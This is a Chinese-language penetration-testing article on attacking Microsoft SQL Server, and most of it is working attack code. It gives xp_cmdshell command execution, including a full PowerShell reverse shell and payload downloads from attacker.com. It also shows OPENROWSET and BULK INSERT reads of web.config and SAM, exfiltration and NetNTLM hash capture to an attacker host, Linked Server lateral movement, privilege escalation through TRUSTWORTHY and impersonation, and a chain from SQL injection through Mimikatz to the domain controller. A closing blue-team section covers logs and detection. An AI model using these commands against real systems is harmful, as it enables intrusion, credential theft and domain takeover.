---
title: "MSSQL xp_cmdshell/OPENROWSET/BULK INSERT/Linked Server RCE与横向移动提权利用技术"
date: 2026-06-20T10:00:00+08:00
draft: false
weight: 85
description: "围绕 MSSQL 的 xp_cmdshell 命令执行、OPENROWSET 文件操作与数据外带、BULK INSERT 批量导入、Linked Server 横向移动、权限提升技术，分析打点识别、数据库枚举、RCE 利用链、域渗透集成、历史 CVE 与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "关系数据库", "MSSQL", "SQL Server", "xp_cmdshell", "OPENROWSET", "BULK INSERT", "Linked Server", "RCE", "横向移动", "提权", "域渗透"]
---

# MSSQL xp_cmdshell/OPENROWSET/BULK INSERT/Linked Server RCE与横向移动提权利用技术

`Microsoft SQL Server` 是企业环境中最广泛部署的关系数据库之一，与 Windows 生态和 Active Directory 深度集成。一个典型生产部署里，MSSQL 至少同时暴露了以下攻击面：

- **TDS Protocol 面**：Tabular Data Stream 协议端口（默认 `1433`，TLS 为 `1434`，Named Pipe 使用 SMB），处理所有 SQL 查询
- **xp_cmdshell 面**：扩展存储过程可直接执行操作系统命令，实现 RCE
- **OPENROWSET 面**：可访问远程数据源、执行文件操作、建立 Ad Hoc 连接
- **BULK INSERT 面**：可从文件系统批量导入数据到数据库表
- **Linked Server 面**：可建立到其他 SQL Server 或 OLE DB 数据源的链接，支持分布式查询
- **OLE Automation 面**：`sp_OACreate`/`sp_OAMethod` 等可调用 COM 对象
- **CLR Integration 面**：Common Language Runtime 可加载 .NET 程序集
- **权限提升面**：`db_owner` 角色、`dbo` 权限、`sa` 账户、Windows 认证集成

对攻击者来说，MSSQL 的价值不在于某个单一漏洞，而在于它把数据存储、文件操作、命令执行、域认证与分布式查询能力集中在同一进程里。一旦获得数据库访问权限（弱密码、默认凭据、SQL 注入），攻击者可以通过 `xp_cmdshell` 执行系统命令、通过 `OPENROWSET` 读取任意文件或外带数据、通过 `BULK INSERT` 导入文件内容、通过 `Linked Server` 横向移动到其他数据库实例，甚至利用 Windows 认证机制直接访问域资源。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 MSSQL
2. 哪些未认证或弱认证场景最值得优先探测
3. 如何通过 `xp_cmdshell` 实现 RCE
4. 如何通过 `OPENROWSET` 实现文件操作与数据外带
5. 如何通过 `BULK INSERT` 实现文件导入
6. 如何通过 `Linked Server` 进行横向移动
7. 如何从普通用户提升到 `sysadmin` 权限
8. 历史 CVE 链如何从信息泄露直接打到域控
9. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:1433/` — MSSQL TDS 协议端口（明文/TLS）
- `:1434/` — MSSQL TLS 端口（备选）
- `:1434/udp` — SQL Server Browser 服务（实例发现）
- `:4022/` — Service Broker（数据库镜像）
- `Named Pipes` — 通过 SMB（445）的命名管道

### 0.2 协议特征

MSSQL 使用 TDS (Tabular Data Stream) 协议。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 1433 mssql.target.example --script ms-sql-info
```

```text
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-info:
|   Microsoft SQL Server 2019:
|     Protocol version: 7.4
|     Encryption: ENCRYPT_OFF
|     Instance name: MSSQLSERVER
|     Version: 15.0.2000.5
|     SP: 0
|     TCP port: 1433
|     Clustered: No
```

### 0.3 手动探测

也可以使用 `sqlcmd` 或 `mssqlclient.py` 手动连接：

```bash
sqlcmd -S mssql.target.example -U sa -P password
```

```bash
python3 mssqlclient.py sa@mssql.target.example
```

如果返回登录成功，说明凭据有效。如果使用 Windows 认证：

```bash
sqlcmd -S mssql.target.example -E
```

```bash
python3 mssqlclient.py -windows-auth domain/user:password@mssql.target.example
```

### 0.4 打点收益优先级

1. 确认目标为 MSSQL、版本号与认证方式（SQL 认证 vs Windows 认证）
2. 通过 `@@version` 回收系统信息
3. 通过 `sys.databases` 枚举所有数据库
4. 通过 `sys.tables` 枚举所有表
5. 判断 `xp_cmdshell` 是否启用
6. 判断 `OPENROWSET` 是否可用
7. 判断 `BULK INSERT` 权限
8. 枚举 `Linked Server` 配置
9. 判断当前用户权限与角色成员关系

---

## 1. 首轮识别：确认目标为 MSSQL

### 1.1 nmap 脚本探测

```bash
nmap -p 1433 mssql.target.example --script ms-sql-info,ms-sql-empty-password,ms-sql-brute
```

```text
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-info:
|   Microsoft SQL Server 2019:
|     Protocol version: 7.4
|     Encryption: ENCRYPT_OFF
|     Instance name: MSSQLSERVER
|     Version: 15.0.2000.5
| ms-sql-empty-password:
|   [192.168.1.100:1433]
|     sa:<empty> - Login Success
| ms-sql-brute:
|   [192.168.1.100:1433]
|     sa:sa - Login Success
```

直接回收：

- MSSQL 版本（2016/2017/2019/2022）
- 协议版本（7.1-7.4）
- 实例名称
- 加密状态
- 空密码或弱密码

### 1.2 SQL Server Browser 枚举

```bash
nmap -p 1434 mssql.target.example --script ms-sql-discover
```

```text
PORT     STATE         SERVICE
1434/udp open|filtered ms-sql-m
| ms-sql-discover:
|   [192.168.1.100]
|     Instance: MSSQLSERVER
|     Version: 15.0.2000.5
|     TCP port: 1433
|     Named pipe: \\MSSQLSERVER\pipe\sql\query
```

可发现多个命名实例。

### 1.3 sqlcmd 连接

```bash
sqlcmd -S mssql.target.example -U sa
```

```text
Password:
1> 
```

如果返回 `1>` 提示符，说明登录成功。

如果使用 Windows 认证且当前用户有权限：

```bash
sqlcmd -S mssql.target.example -E
```

### 1.4 版本查询

```sql
SELECT @@version;
```

```text
Microsoft SQL Server 2019 (RTM-CU15) (KB5008996) - 15.0.4198.2 (X64) 
	Jan 12 2022 22:30:08 
	Copyright (C) 2019 Microsoft Corporation
	Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

回收信息：

- 精确版本号与 CU 级别
- 操作系统版本
- 架构（x64/x86）
- 版本类型（Standard/Enterprise/Express）

---

## 2. 信息回收：数据库与权限枚举

### 2.1 当前用户与权限

```sql
-- 当前用户
SELECT SYSTEM_USER AS CurrentUser, USER AS DatabaseUser;

-- 当前登录信息
SELECT 
    SUSER_NAME() AS LoginName,
    ORIGINAL_LOGIN() AS OriginalLogin;

-- 是否为 sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;

-- 服务器角色成员
SELECT 
    sp.name AS LoginName,
    sp.type_desc AS LoginType,
    sp.is_disabled AS Disabled,
    sp.default_database_name AS DefaultDB
FROM sys.server_principals sp
WHERE sp.type IN ('S', 'U', 'G')
ORDER BY sp.name;

-- 数据库角色成员
SELECT 
    dp.name AS UserName,
    dp.type_desc AS UserType,
    r.name AS RoleName
FROM sys.database_principals dp
LEFT JOIN sys.database_role_members drm ON dp.principal_id = drm.member_principal_id
LEFT JOIN sys.database_principals r ON drm.role_principal_id = r.principal_id
ORDER BY dp.name;
```

### 2.2 数据库枚举

```sql
-- 所有数据库
SELECT 
    name AS DatabaseName,
    database_id,
    state_desc AS State,
    compatibility_level AS CompatLevel,
    collation_name,
    is_read_only,
    is_trustworthy_on
FROM sys.databases
ORDER BY name;

-- 当前数据库的表
SELECT 
    TABLE_SCHEMA,
    TABLE_NAME,
    TABLE_TYPE
FROM INFORMATION_SCHEMA.TABLES
ORDER BY TABLE_SCHEMA, TABLE_NAME;

-- 所有表（包括系统表）
SELECT 
    s.name AS SchemaName,
    t.name AS TableName,
    t.type_desc,
    p.rows AS RowCount
FROM sys.tables t
INNER JOIN sys.schemas s ON t.schema_id = s.schema_id
INNER JOIN sys.partitions p ON t.object_id = p.object_id AND p.index_id IN (0, 1)
ORDER BY s.name, t.name;
```

### 2.3 敏感数据搜索

```sql
-- 搜索包含 password/credential/secret 的列
SELECT 
    TABLE_SCHEMA,
    TABLE_NAME,
    COLUMN_NAME,
    DATA_TYPE
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%'
   OR COLUMN_NAME LIKE '%credential%'
   OR COLUMN_NAME LIKE '%secret%'
   OR COLUMN_NAME LIKE '%key%'
   OR COLUMN_NAME LIKE '%token%'
ORDER BY TABLE_SCHEMA, TABLE_NAME;
```

---

## 3. xp_cmdshell RCE

### 3.1 检查 xp_cmdshell 状态

```sql
-- 检查是否启用
SELECT value_in_use 
FROM sys.configurations 
WHERE name = 'xp_cmdshell';

-- 或者
EXEC sp_configure 'xp_cmdshell';
```

### 3.2 启用 xp_cmdshell

需要 `sysadmin` 或 `CONTROL SERVER` 权限：

```sql
-- 启用高级选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 3.3 执行系统命令

```sql
-- 基本命令执行
EXEC xp_cmdshell 'whoami';

-- 回收系统信息
EXEC xp_cmdshell 'systeminfo';

-- 网络信息
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'netstat -ano';

-- 域信息
EXEC xp_cmdshell 'net user /domain';
EXEC xp_cmdshell 'net group "Domain Admins" /domain';

-- 下载文件
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\Windows\Temp\shell.exe"';

-- 执行文件
EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';

-- 反向 Shell
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker.com'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

### 3.4 输出回收

```sql
-- 创建临时表回收输出
CREATE TABLE #output (line VARCHAR(MAX));
INSERT INTO #output EXEC xp_cmdshell 'dir C:\';
SELECT * FROM #output;
DROP TABLE #output;
```

### 3.5 绕过限制

如果 `xp_cmdshell` 被禁用且无法启用：

```sql
-- 尝试通过 Agent Job 执行
USE msdb;
EXEC dbo.sp_add_job @job_name = N'TestJob';
EXEC dbo.sp_add_jobstep @job_name = N'TestJob', 
    @step_name = N'TestStep',
    @subsystem = N'TSQL',
    @command = N'EXEC xp_cmdshell ''whoami''',
    @retry_attempts = 1,
    @retry_interval = 5;
EXEC dbo.sp_start_job @job_name = N'TestJob';
```

---

## 4. OPENROWSET 文件操作与数据外带

### 4.1 检查 OPENROWSET 权限

```sql
-- 检查 Ad Hoc Distributed Queries 是否启用
SELECT value_in_use 
FROM sys.configurations 
WHERE name = 'Ad Hoc Distributed Queries';

-- 检查当前用户权限
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ADMINISTER BULK OPERATIONS');
```

### 4.2 启用 OPENROWSET

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;
```

### 4.3 读取本地文件

```sql
-- 读取文本文件
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS f;

-- 读取敏感文件
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS f;
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\NTUser.dat', SINGLE_BLOB) AS f;

-- 读取 UNC 路径（SMB 外带）
SELECT * FROM OPENROWSET(BULK '\\attacker.com\share\file.txt', SINGLE_CLOB) AS f;
```

### 4.4 数据外带到远程服务器

```sql
-- 外带数据到攻击者控制的 MSSQL
SELECT * FROM OPENROWSET(
    'SQLOLEDB',
    'Server=attacker.com;Trusted_Connection=yes;',
    'SELECT * FROM OPENROWSET(BULK ''C:\sensitive\data.txt'', SINGLE_CLOB) AS f'
);

-- 外带到 MySQL
SELECT * FROM OPENROWSET(
    'MSDASQL',
    'DRIVER={MySQL ODBC 8.0 Unicode Driver};SERVER=attacker.com;DATABASE=exfil;USER=root;PASSWORD=password;',
    'INSERT INTO exfil_table VALUES (''stolen_data'')'
);
```

### 4.5 SMB 认证捕获

```sql
-- 触发 SMB 连接，捕获 NetNTLM 哈希
SELECT * FROM OPENROWSET(BULK '\\attacker.com\share\dummy.txt', SINGLE_CLOB) AS f;

-- 使用 Responder 捕获
-- attacker: sudo responder -I eth0
```

### 4.6 通过 OPENROWSET 执行命令

```sql
-- 通过 OLE Automation 执行命令
DECLARE @obj INT;
EXEC sp_OACreate 'WScript.Shell', @obj OUTPUT;
EXEC sp_OAMethod @obj, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt', 0, TRUE;
EXEC sp_OADestroy @obj;

-- 回收输出
SELECT * FROM OPENROWSET(BULK 'C:\temp\output.txt', SINGLE_CLOB) AS f;
```

---

## 5. BULK INSERT 文件导入

### 5.1 检查 BULK INSERT 权限

```sql
-- 检查是否有 ADMINISTER BULK OPERATIONS 权限
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ADMINISTER BULK OPERATIONS');

-- 检查是否为 sysadmin 或 bulkadmin 角色
SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysAdmin;
SELECT IS_SRVROLEMEMBER('bulkadmin') AS IsBulkAdmin;
```

### 5.2 创建目标表

```sql
-- 创建临时表
CREATE TABLE #bulkdata (
    line VARCHAR(MAX)
);
```

### 5.3 导入本地文件

```sql
-- 导入文本文件
BULK INSERT #bulkdata
FROM 'C:\Windows\System32\drivers\etc\hosts'
WITH (
    FIELDTERMINATOR = '\n',
    ROWTERMINATOR = '\n'
);

SELECT * FROM #bulkdata;
DROP TABLE #bulkdata;
```

### 5.4 导入敏感文件

```sql
-- 导入 web.config
CREATE TABLE #webconfig (content VARCHAR(MAX));
BULK INSERT #webconfig
FROM 'C:\inetpub\wwwroot\web.config'
WITH (FIELDTERMINATOR = '\n', ROWTERMINATOR = '\n');
SELECT * FROM #webconfig;
DROP TABLE #webconfig;

-- 导入 SAM 数据库（需要 SYSTEM 权限）
CREATE TABLE #sam (content VARBINARY(MAX));
BULK INSERT #sam
FROM 'C:\Windows\System32\config\SAM'
WITH (FIELDTERMINATOR = '', ROWTERMINATOR = '');
SELECT * FROM #sam;
DROP TABLE #sam;
```

### 5.5 导入 UNC 路径

```sql
-- 从网络共享导入
CREATE TABLE #networkdata (line VARCHAR(MAX));
BULK INSERT #networkdata
FROM '\\fileserver\share\data.txt'
WITH (FIELDTERMINATOR = '\n', ROWTERMINATOR = '\n');
SELECT * FROM #networkdata;
DROP TABLE #networkdata;
```

### 5.6 批量导入到永久表

```sql
-- 创建永久表
CREATE TABLE exfil_data (
    id INT IDENTITY(1,1),
    content VARCHAR(MAX),
    import_time DATETIME DEFAULT GETDATE()
);

-- 批量导入
BULK INSERT exfil_data
FROM 'C:\data\dump.csv'
WITH (
    FIELDTERMINATOR = ',',
    ROWTERMINATOR = '\n',
    FIRSTROW = 2,
    CODEPAGE = '65001'
);
```

---

## 6. Linked Server 横向移动

### 6.1 枚举 Linked Server

```sql
-- 查看所有 Linked Server
SELECT 
    name AS LinkedServerName,
    provider,
    data_source,
    is_remote_login_enabled,
    is_rpc_out_enabled
FROM sys.servers
WHERE is_linked = 1;

-- 查看 Linked Server 登录映射
SELECT 
    s.name AS LinkedServerName,
    l.local_principal_id,
    l.uses_self_credential,
    l.remote_name
FROM sys.linked_logins l
INNER JOIN sys.servers s ON l.server_id = s.server_id;
```

### 6.2 查询远程数据

```sql
-- 查询远程数据库
SELECT * FROM [LinkedServerName].[RemoteDB].[dbo].[TableName];

-- 使用 OPENQUERY
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT * FROM RemoteDB.dbo.TableName');

-- 使用 EXEC
EXEC [LinkedServerName].[RemoteDB].[dbo].[sp_executesql] N'SELECT @@version';
```

### 6.3 在 Linked Server 上执行命令

如果 Linked Server 配置了 `rpc out`：

```sql
-- 直接在远程服务器执行命令
EXEC [LinkedServerName].master.dbo.sp_executesql N'EXEC xp_cmdshell ''whoami''';

-- 或者
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServerName];
```

### 6.4 创建 Linked Server

如果有 `sysadmin` 权限：

```sql
-- 创建到攻击者服务器的 Linked Server
EXEC sp_addlinkedserver 
    @server = N'AttackerServer',
    @srvproduct = N'',
    @provider = N'SQLNCLI',
    @datasrc = N'attacker.com';

-- 配置登录凭据
EXEC sp_addlinkedsrvlogin 
    @rmtsrvname = N'AttackerServer',
    @useself = N'False',
    @locallogin = NULL,
    @rmtuser = N'sa',
    @rmtpassword = N'password';

-- 测试连接
SELECT * FROM [AttackerServer].[master].[sys].[databases];
```

### 6.5 通过 Linked Server 横向移动

```sql
-- 枚举域内所有 SQL Server
EXEC sp_helpserver;

-- 逐个测试连接
EXEC [SQLServer1].master.dbo.sp_executesql N'SELECT @@servername';
EXEC [SQLServer2].master.dbo.sp_executesql N'SELECT @@servername';

-- 在远程服务器枚举权限
EXEC [SQLServer1].master.dbo.sp_executesql N'
    SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')
';

-- 在远程服务器执行命令
EXEC [SQLServer1].master.dbo.sp_executesql N'
    EXEC xp_cmdshell ''powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\Temp\shell.exe"''
';
EXEC [SQLServer1].master.dbo.sp_executesql N'
    EXEC xp_cmdshell ''C:\Temp\shell.exe''
';
```

### 6.6 利用 Windows 认证

```sql
-- 使用当前 Windows 用户连接到 Linked Server
EXEC sp_addlinkedsrvlogin 
    @rmtsrvname = N'TargetServer',
    @useself = N'True';

-- 查询远程数据（使用当前 Windows 身份）
SELECT * FROM [TargetServer].[RemoteDB].[dbo].[SensitiveTable];
```

---

## 7. 权限提升

### 7.1 从 db_owner 到 sysadmin

```sql
-- 检查当前数据库权限
SELECT 
    dp.name AS UserName,
    dp.type_desc,
    r.name AS RoleName
FROM sys.database_principals dp
LEFT JOIN sys.database_role_members drm ON dp.principal_id = drm.member_principal_id
LEFT JOIN sys.database_principals r ON drm.role_principal_id = r.principal_id
WHERE dp.name = USER_NAME();

-- 如果当前用户是 db_owner，可以创建存储过程并标记为可信
USE [TargetDB];
GO

-- 创建存储过程
CREATE PROCEDURE sp_elevate
WITH EXECUTE AS OWNER
AS
BEGIN
    EXEC sp_addsrvrolemember 'attacker_user', 'sysadmin';
END;
GO

-- 执行存储过程
EXEC sp_elevate;
```

### 7.2 利用 TRUSTWORTHY 数据库

```sql
-- 检查哪些数据库启用了 TRUSTWORTHY
SELECT name, is_trustworthy_on 
FROM sys.databases 
WHERE is_trustworthy_on = 1;

-- 如果目标数据库启用了 TRUSTWORTHY，且当前用户是 db_owner
USE [TrustworthyDB];
GO

-- 创建存储过程提升权限
CREATE PROCEDURE sp_trustworthy_elevate
WITH EXECUTE AS OWNER
AS
BEGIN
    -- 添加 sysadmin 角色
    EXEC sp_addsrvrolemember 'attacker_user', 'sysadmin';
    
    -- 或者启用 xp_cmdshell
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
END;
GO

EXEC sp_trustworthy_elevate;
```

### 7.3 利用 CLR Assembly

```sql
-- 检查 CLR 是否启用
SELECT value_in_use 
FROM sys.configurations 
WHERE name = 'clr enabled';

-- 启用 CLR
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 创建恶意程序集（需要先编译 DLL）
CREATE ASSEMBLY MaliciousAssembly
FROM 'C:\temp\Malicious.dll'
WITH PERMISSION_SET = UNSAFE;

-- 创建存储过程
CREATE PROCEDURE sp_malicious
AS EXTERNAL NAME MaliciousAssembly.[Malicious.StoredProcedures].ExecuteCommand;

-- 执行
EXEC sp_malicious;
```

### 7.4 利用 impersonate 权限

```sql
-- 检查是否有 impersonate 权限
SELECT * FROM sys.server_permissions 
WHERE permission_name = 'IMPERSONATE';

-- 模拟 sa 用户
EXECUTE AS LOGIN = 'sa';

-- 现在以 sa 身份执行命令
EXEC xp_cmdshell 'whoami';

-- 恢复原始身份
REVERT;
```

### 7.5 利用未加密的连接字符串

```sql
-- 搜索包含密码的连接字符串
SELECT 
    TABLE_NAME,
    COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%connection%'
   OR COLUMN_NAME LIKE '%config%';

-- 读取 web.config
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS f;
```

---

## 8. 历史 CVE 与攻击链

### 8.1 CVE-2020-0618 (SSRS RCE)

SQL Server Reporting Services 远程代码执行：

```text
影响版本：SQL Server 2016/2017/2019
利用条件：SSRS 服务暴露
利用方式：通过特制请求触发反序列化漏洞
```

### 8.2 CVE-2019-1068 (SQL Agent 提权)

SQL Server Agent 作业提权：

```text
影响版本：SQL Server 2012-2017
利用条件：SQL Agent 服务运行
利用方式：通过创建恶意作业提升权限
```

### 8.3 CVE-2020-17183 (Azure SQL 提权)

Azure SQL Database 提权：

```text
影响版本：Azure SQL Database
利用条件：Azure 环境
利用方式：通过特制 TDS 包提升权限
```

### 8.4 完整攻击链示例

从 SQL 注入到域控：

```text
1. Web 应用 SQL 注入 -> MSSQL sa 账户
2. 启用 xp_cmdshell -> 系统命令执行
3. 下载 Mimikatz -> 提取内存凭据
4. 回收域管理员哈希 -> Pass-the-Hash
5. 访问域控 -> 完全控制
```

```sql
-- Step 1: SQL 注入点
SELECT * FROM users WHERE id = 1; UNION SELECT 1,@@version,3--

-- Step 2: 启用 xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Step 3: 下载 Mimikatz
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/mimikatz.exe -OutFile C:\Temp\mimikatz.exe"';--

-- Step 4: 提取凭据
'; EXEC xp_cmdshell 'C:\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\Temp\creds.txt';--

-- Step 5: 回收凭据
'; SELECT * FROM OPENROWSET(BULK 'C:\Temp\creds.txt', SINGLE_CLOB) AS f;--
```

---

## 9. 蓝队检测与应急响应

### 9.1 关键日志位置

```text
# SQL Server 错误日志
C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG

# SQL Server Agent 日志
C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\SQLAgent.out

# Windows 安全日志
Event Viewer -> Windows Logs -> Security

# SQL Server 审计日志（如果启用）
SELECT * FROM sys.fn_get_audit_file('C:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT);
```

### 9.2 可疑活动指标

```sql
-- 检查 xp_cmdshell 启用历史
SELECT 
    name,
    value,
    value_in_use,
    minimum,
    maximum
FROM sys.configurations
WHERE name = 'xp_cmdshell';

-- 检查最近的作业执行
SELECT 
    j.name AS JobName,
    h.step_name,
    h.command,
    h.run_date,
    h.run_time,
    h.run_status
FROM msdb.dbo.sysjobs j
INNER JOIN msdb.dbo.sysjobhistory h ON j.job_id = h.job_id
WHERE h.run_date >= CONVERT(INT, CONVERT(VARCHAR(8), GETDATE()-7, 112))
ORDER BY h.run_date DESC, h.run_time DESC;

-- 检查 Linked Server 配置
SELECT 
    s.name,
    s.provider,
    s.data_source,
    l.remote_name,
    l.uses_self_credential
FROM sys.servers s
LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id
WHERE s.is_linked = 1;

-- 检查最近的 BULK INSERT 操作
SELECT 
    event_time,
    server_principal_name,
    statement
FROM sys.fn_get_audit_file('C:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT)
WHERE statement LIKE '%BULK INSERT%'
   OR statement LIKE '%OPENROWSET%';
```

### 9.3 Windows 事件日志狩猎

```powershell
# 查找可疑的进程创建
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} | 
    Where-Object {$_.Message -match 'cmd.exe|powershell.exe|xp_cmdshell'} |
    Select-Object TimeCreated, Message |
    Format-List

# 查找可疑的服务创建
Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} |
    Where-Object {$_.Message -match 'SQL Server'} |
    Select-Object TimeCreated, Message |
    Format-List

# 查找 SMB 连接（OPENROWSET UNC 路径）
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-SMBClient/Connectivity'} |
    Select-Object TimeCreated, Message |
    Format-List
```

### 9.4 网络层检测

```text
# 可疑端口
:1433 - MSSQL 标准端口
:1434 - SQL Server Browser
:445  - SMB（Named Pipe/UNC 路径）

# 可疑流量特征
- TDS 协议中的 xp_cmdshell 调用
- OPENROWSET 到外部 IP 的连接
- BULK INSERT 从 UNC 路径导入
- Linked Server 到未知服务器
```

### 9.5 应急响应清单

```text
1. 确认 MSSQL 实例是否被入侵
   - 检查 ERRORLOG 中的异常登录
   - 检查 sys.configurations 中 xp_cmdshell 状态
   - 检查 sys.servers 中的 Linked Server

2. 回收攻击者活动
   - 分析 SQL Server 审计日志
   - 分析 Windows 安全日志（进程创建、SMB 连接）
   - 检查 msdb.dbo.sysjobs 中的恶意作业

3. 凭据泄露评估
   - 检查是否执行了 Mimikatz
   - 检查 web.config 等配置文件是否被读取
   - 检查 Linked Server 凭据是否泄露

4. 系统隔离与修复
   - 禁用 xp_cmdshell
   - 删除可疑 Linked Server
   - 重置所有数据库账户密码
   - 应用最新安全补丁

5. 域环境评估
   - 如果域凭据泄露，执行域级别应急响应
   - 重置 krbtgt 账户
   - 检查黄金/白银票据
```

---

## 10. 参考材料

### 10.1 官方文档

- Microsoft SQL Server 安全最佳实践：https://docs.microsoft.com/sql/relational-databases/security/securing-sql-server
- xp_cmdshell 文档：https://docs.microsoft.com/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- OPENROWSET 文档：https://docs.microsoft.com/sql/t-sql/functions/openrowset-transact-sql
- Linked Server 文档：https://docs.microsoft.com/sql/relational-databases/linked-servers/linked-servers-database-engine

### 10.2 攻击工具

- Impacket mssqlclient：https://github.com/SecureAuthCorp/impacket
- PowerUpSQL：https://github.com/NetSPI/PowerUpSQL
- SQLMap：https://github.com/sqlmapproject/sqlmap
- Responder（SMB 捕获）：https://github.com/SpiderLabs/Responder

### 10.3 检测工具

- SQL Server Audit：https://docs.microsoft.com/sql/relational-databases/security/auditing/sql-server-audit-database-engine
- Extended Events：https://docs.microsoft.com/sql/relational-databases/extended-events/extended-events
- SQL Server Profiler：https://docs.microsoft.com/sql/tools/sql-server-profiler/sql-server-profiler

### 10.4 相关 CVE

- CVE-2020-0618：SQL Server Reporting Services RCE
- CVE-2019-1068：SQL Server Agent 提权
- CVE-2020-17183：Azure SQL Database 提权
- CVE-2016-3203：SQL Server 权限提升
- CVE-2014-4061：SQL Server 权限提升

---

## 总结

MSSQL 攻击面的核心在于它把数据存储、文件操作、命令执行、域认证与分布式查询能力集中在同一进程里。一旦获得数据库访问权限，攻击者可以通过 `xp_cmdshell` 实现 RCE、通过 `OPENROWSET` 进行文件操作与数据外带、通过 `BULK INSERT` 导入敏感文件、通过 `Linked Server` 横向移动到其他数据库实例，甚至利用 Windows 认证机制直接访问域资源。

对蓝队来说，关键是：

1. **最小权限原则**：严格限制数据库账户权限，禁用不必要的功能（xp_cmdshell、OPENROWSET、CLR）
2. **网络隔离**：MSSQL 端口不应直接暴露到互联网，使用防火墙限制访问
3. **审计日志**：启用 SQL Server Audit 和 Extended Events，记录所有敏感操作
4. **凭据保护**：使用强密码，定期轮换，避免在连接字符串中硬编码密码
5. **补丁管理**：及时应用 SQL Server 安全补丁
6. **域集成监控**：监控 MSSQL 服务账户的域活动，检测异常认证行为
